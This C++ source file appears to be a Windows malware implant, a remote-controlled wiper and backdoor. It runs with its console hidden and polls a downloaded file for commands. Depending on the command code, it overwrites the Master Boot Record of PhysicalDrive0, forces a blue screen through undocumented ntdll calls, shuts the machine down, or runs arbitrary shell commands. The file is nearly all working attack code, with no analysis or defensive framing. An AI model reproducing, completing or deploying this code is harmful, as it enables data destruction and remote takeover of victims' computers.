#include <iostream>
#include <algorithm>
#include <vector>
#include <fstream>
#include <windows.h>
#include <string>
#include <cstddef>
#include <sstream>
#include <memory>
#include <cstdio>
#include "download.h"
#include "LCb.h"
#include "rwFlags.h"
#include <winternl.h>
typedef NTSTATUS(NTAPI *pdef_NtRaiseHardError)(NTSTATUS ErrorStatus, ULONG NumberOfParameters, ULONG UnicodeStringParameterMask OPTIONAL, PULONG_PTR Parameters, ULONG ResponseOption, PULONG Response);
typedef NTSTATUS(NTAPI *pdef_RtlAdjustPrivilege)(ULONG Privilege, BOOLEAN Enable, BOOLEAN CurrentThread, PBOOLEAN Enabled);

std::string uniCode = "bcast";

std::string flagsFile = "C:\\Bootstrap\\flags";

bool isRegistryKeyExists(const std::wstring& keyPath = L"SOFTWARE\\RSEIDPATH") {
    HKEY hKey;
    LONG result = RegOpenKeyExW(HKEY_CURRENT_USER, keyPath.c_str(), 0, KEY_READ, &hKey);
    if (result == ERROR_SUCCESS) {
        RegCloseKey(hKey);
        return true;
    }
    return false;
}

/**
 * Writes the Master Boot Record (MBR) to the PhysicalDrive0 handle.
 *
 * @return 0 if the MBR was successfully written, -1 otherwise.
 *
 * @throws ErrorType if there is an error while writing the MBR.
 */
int _WriteMBR() { // used from Zer0Mem0ry
    // just open a handle to PhysicalDrive0, and we write our custom bootloader
    // https://docs.microsoft.com/en-us/windows/win32/api/fileapi/nf-fileapi-createfilew
    DWORD dwBytesWritten;
    HANDLE hDevice = CreateFileW(
        L"\\\\.\\PhysicalDrive0", GENERIC_ALL,
        FILE_SHARE_READ | FILE_SHARE_WRITE, 0,
        OPEN_EXISTING, 0, 0);

    WriteFile(hDevice, LCb.data(), 512, &dwBytesWritten, 0); // write the file to the handle
    if (hDevice) {
        return 0;
        CloseHandle(hDevice); // close the handle
    }
    else {
        return -1;
        CloseHandle(hDevice); // close the handle
    }
}

/**
 * Calls the Blue Screen of Death (BSoD) by creating a file with the name "BSoDFile"
 * in the "$MFT" directory.
 *
 * @param None
 *
 * @return None
 *
 * @throws None
 */
void _CallBSoD() {
	BOOLEAN bEnabled;
    ULONG uResp;
    LPVOID lpFuncAddress = (LPVOID)GetProcAddress(LoadLibraryA("ntdll.dll"), "RtlAdjustPrivilege");
    LPVOID lpFuncAddress2 = (LPVOID)GetProcAddress(GetModuleHandle("ntdll.dll"), "NtRaiseHardError");
    pdef_RtlAdjustPrivilege NtCall = (pdef_RtlAdjustPrivilege)lpFuncAddress;
    pdef_NtRaiseHardError NtCall2 = (pdef_NtRaiseHardError)lpFuncAddress2;
    NTSTATUS NtRet = NtCall(19, TRUE, FALSE, &bEnabled); 
    NtCall2(STATUS_FLOAT_MULTIPLE_FAULTS, 0, 0, 0, 6, &uResp); 
}

/**
 * CodeAlpha function calls _WriteMBR and _CallBSoD.
 *
 * @param None
 *
 * @return None
 *
 * @throws None
 */
void CodeAlpha() {
    _WriteMBR();
    _CallBSoD();
}

void SetCurrentID(int Id) {
    const wchar_t* REGISTRY_PATH = L"SOFTWARE\\RSEIDPATH";
    const wchar_t* REGISTRY_VALUE_NAME = L"ID";
    HKEY hKey;
    LONG result;

    // Open or create the registry key
    result = RegCreateKeyExW(HKEY_CURRENT_USER, REGISTRY_PATH, 0, NULL, 0, KEY_READ | KEY_WRITE, NULL, &hKey, NULL);
    if (result != ERROR_SUCCESS) {
        std::cout << "Failed to open or create registry key." << std::endl;
    }

    // Read the ID from the registry
    DWORD id = Id;
    DWORD dataSize = sizeof(DWORD);

    // Save the ID to the registry
    result = RegSetValueExW(hKey, REGISTRY_VALUE_NAME, 0, REG_DWORD, reinterpret_cast<const BYTE*>(&id), sizeof(DWORD));
    if (result != ERROR_SUCCESS) {
        std::cout << "Failed to save ID to the registry." << std::endl;
    }

    // Close the registry key
    RegCloseKey(hKey);
}

int GetRegistryKeyValue(const std::wstring& keyPath = L"SOFTWARE\\RSEIDPATH", const std::wstring& valueName = L"ID") {
    HKEY hKey;
    LONG result = RegOpenKeyExW(HKEY_CURRENT_USER, keyPath.c_str(), 0, KEY_READ, &hKey);
    if (result == ERROR_SUCCESS) {
        DWORD valueType;
        DWORD dataSize;
        result = RegQueryValueExW(hKey, valueName.c_str(), NULL, &valueType, NULL, &dataSize);
        if (result == ERROR_SUCCESS && valueType == REG_DWORD && dataSize == sizeof(DWORD)) {
            DWORD value;
            result = RegQueryValueExW(hKey, valueName.c_str(), NULL, NULL, reinterpret_cast<LPBYTE>(&value), &dataSize);
            if (result == ERROR_SUCCESS) {
                RegCloseKey(hKey);
                return static_cast<int>(value);
            }
        }
        RegCloseKey(hKey);
    }
    return -1; // Возврат значения -1, если чтение значения ключа не удалось
}

/**
 * Reboots the system by executing the "shutdown" command with the specified arguments.
 *
 * @param None
 *
 * @return None
 *
 * @throws None
 */
void _Reboot() {
    system("shutdown -s -f -t 0");
}

/**
 * CodeBeta function.
 *
 * This function is responsible for writing MBR and rebooting.
 * 
 * @throws ErrorType description of error
 */
void CodeBeta() {
    _WriteMBR();
    _Reboot();
}

/**
 * CodeGamma function.
 *
 * This function is responsible for writing MBR.
 * 
 * @throws ErrorType description of error
 */
void CodeGamma() {
    _WriteMBR();
}

void CodeDelta() {
    _CallBSoD();
}

/**
 * Writes the callback for the given contents.
 *
 * @param contents the pointer to the contents to be written
 * @param size the size of each element in the contents
 * @param nmemb the number of elements in the contents
 * @param output the string to append the contents to
 *
 * @return the total size of the appended contents
 *
 * @throws None
 */
size_t WriteCallback(void* contents, size_t size, size_t nmemb, std::string* output) {
    size_t totalSize = size * nmemb;
    output->append(static_cast<char*>(contents), totalSize);
    return totalSize;
}

/**
 * Parses a command and returns the result as a string.
 *
 * @param useInteralCommand Flag indicating whether to use an internal command (default: false).
 * @param interalCommand The internal command to use (default: "no int command").
 *
 * @return The parsed command as a string.
 *
 * @throws ErrorType If there is an error parsing the command.
 */
std::string parseCommand(bool useInteralCommand = false, std::string interalCommand = "nocom") {
    if (useInteralCommand) {
        return interalCommand;
    }
    else {
        std::ifstream file(downloadFile());
        std::string output;
        if (file.is_open()) {
            std::string line;
            while (std::getline(file, line)) {
                output += line;
            }
            file.close();
        }
        return output;
    }
}

void handleCommand(std::string command = parseCommand()) {
    try {
        std::string buffer;
        
        // Check if the registry key exists
        if (!isRegistryKeyExists()) {
            // If the command starts with 's', set the current ID
            if (command[0] == 's') {
                buffer = command.substr(1, 6);
                SetCurrentID(std::stoi(buffer));
            }
        }
        else {
            buffer = command.substr(0, 5);
            
            // If the command does not start with 's', check if the registry key value matches
            if (command[0] != 's') {
                if (buffer == uniCode) {
                    
                }
                else if (GetRegistryKeyValue() != std::stoi(buffer)) {
                   return; 
                }
            }
            
            char code = command[5];
            
            // Execute code based on the command code
            switch (code) {
                case 'a':
                    return CodeAlpha();
                case 'b':
                    return CodeBeta();
                case 'g':
                    return CodeGamma();
                case 'c': //custom command
                    buffer = command.substr(8, 32767);
                    system(buffer.c_str());
                case 'f': //set flags
                    rwFlags(command[8], command.substr(10, 14), flagsFile, std::stoi(command.substr(16, 24)));
                case 'd':
                    return CodeDelta();
            }
        }
    } catch (...) {
        std::cout << "Error" << std::endl;
    }
}

int main(int argc, char* argv[]) {
    if (argc > 1) {
        handleCommand(parseCommand(true, argv[1]));
    }
    bool isDebbuging = false;
    if (isDebbuging) {
        std::cout << GetRegistryKeyValue() << std::endl;
        std::cout << isRegistryKeyExists() << std::endl;
        std::cout << "NOTE: If the output of console is: stoi then the ID isn't correct!" << std::endl;
    }
    else {
    ShowWindow(GetConsoleWindow(), SW_HIDE);
    }
    while (true) {
        handleCommand();
        Sleep(rwFlags('r', "RS", flagsFile, 0));
    }
}
